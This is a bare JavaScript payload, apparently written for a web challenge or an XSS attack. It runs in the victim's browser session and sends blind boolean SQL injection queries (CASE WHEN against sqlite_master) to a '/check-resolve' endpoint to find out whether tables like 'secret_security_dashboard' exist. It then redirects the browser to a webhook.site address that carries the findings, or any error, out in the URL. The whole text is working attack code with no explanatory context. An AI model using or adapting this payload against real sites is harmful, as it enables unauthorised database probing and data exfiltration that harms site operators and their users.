(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const names=[
      'security_reports',
      'secret_security_dashboard',
      'submissions'
    ];

    let out=[];
    for(const name of names){
      const body=new URLSearchParams();
      body.append('id',`CASE WHEN ((SELECT count(*) FROM sqlite_master WHERE type='table' AND name='${name}')>0) THEN 6 ELSE 7 END`);

      const r=await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });

      const t=await r.text();
      out.push(name+'='+(t.includes('Not yet')?'YES':'NO'));
    }

    location=hook+'?d='+encodeURIComponent(out.join(' | '));
  }catch(e){
    location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err='+encodeURIComponent(e.toString());
  }
})();